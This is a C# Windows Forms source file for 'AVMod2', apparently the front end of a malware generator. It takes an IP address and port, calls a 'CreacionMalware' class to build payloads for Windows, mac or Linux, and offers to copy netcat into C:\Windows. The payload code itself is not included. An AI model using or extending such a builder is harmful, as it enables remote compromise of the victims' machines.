using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace AVMod2
{
    public partial class AVMod2 : Form
    {
        Point formPosition;//Variable posicion
        Boolean mouseAction;//Booleano, activacion del mouse
        validacion valid = new validacion();
        CreacionMalware creacion = new CreacionMalware();
        public AVMod2()
        {
            InitializeComponent();
            GoComprobar();
            NcComprobar();
        }
        private void GoComprobar()
        {
            string path = @"C:\Go";
            if (!Directory.Exists(path))
            {
                DialogResult go = MessageBox.Show("No se encontro go. ¿Desea instarlo?","Go no esta instalado.",MessageBoxButtons.YesNo,MessageBoxIcon.Error);
                if (go == DialogResult.Yes)
                {
                    Process.Start("https://golang.org/dl/");
                    this.Close();
                }
                else
                {
                    MessageBox.Show("Si hay algún error, ya sabras porque sera.", "Go no esta instalado.", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }
        private void NcComprobar()
        {
            string path = @"C:\Windows\nc.exe";
            if (!File.Exists(path))
            {
                DialogResult nc = MessageBox.Show("No se encontro Netcat. ¿Desea añadirlo a su sistema?", "Netcat no se encuentra.", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                if (nc == DialogResult.Yes)
                {
                    File.Move("nc.exe", path);
                }
                else
                {
                    MessageBox.Show("Si hay algún error, ya sabras porque sera.", "Netcat no se encuentra", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }
        private void cerrar_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void cerrar_MouseHover(object sender, EventArgs e)
        {
            cerrar.ForeColor = Color.Red;
        }

        private void cerrar_MouseLeave(object sender, EventArgs e)
        {
            cerrar.ForeColor = Color.Black;
        }
        private void guardar_Click(object sender, EventArgs e)
        {
            //minimizar ventana
            this.WindowState = FormWindowState.Minimized;
        }
        private void guardar_MouseHover(object sender, EventArgs e)
        {
            guardar.ForeColor = Color.Red;
        }

        private void guardar_MouseLeave(object sender, EventArgs e)
        {
            guardar.ForeColor = Color.Black;
        }
        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            //nueva posicion entre x and y
            formPosition = new Point(Cursor.Position.X - Location.X, Cursor.Position.Y - Location.Y);
            //activar variable
            mouseAction = true;
        }
        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseAction == true)
            {
                Location = new Point(Cursor.Position.X - formPosition.X, Cursor.Position.Y - formPosition.Y);
            }
        }
        private void Form1_MouseUp(object sender, MouseEventArgs e)
        {
            //si soltamos el programa, la variable se desactiva
            mouseAction = false;
        }

        private void ip_KeyPress(object sender, KeyPressEventArgs e)
        {
            valid.validarIP(e);
        }

        private void puerto_KeyPress(object sender, KeyPressEventArgs e)
        {
            valid.validarPUERTO(e);
            
        }
        private void go_Click(object sender, EventArgs e)
        {
            creacion.IpAdress = ip.Text;
            creacion.Puerto1 = puerto.Text;
            if (Windows.Checked == true)
            {
                creacion.windows();
            }
            else if (mac.Checked == true)
            {
                creacion.mac();
            }
            else if (linux.Checked == true)
            {
                creacion.linux();
            }
            else if (todos.Checked == true)
            {
                creacion.todos();
            }
            else
            {
                MessageBox.Show("Por favor seleccione una opción.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void twitter_Click(object sender, EventArgs e)
        {
            twitter.BackColor = Color.Crimson;
            Process.Start("https://twitter.com/AndresMontoyaIN");
        }

        private void google_Click(object sender, EventArgs e)
        {
            google.BackColor = Color.Crimson;
            Process.Start("https://plus.google.com/+SpyRockLinux");
        }

        private void git_Click(object sender, EventArgs e)
        {
            git.BackColor = Color.Crimson;
            Process.Start("https://github.com/Spyrock");
        }
    }
}
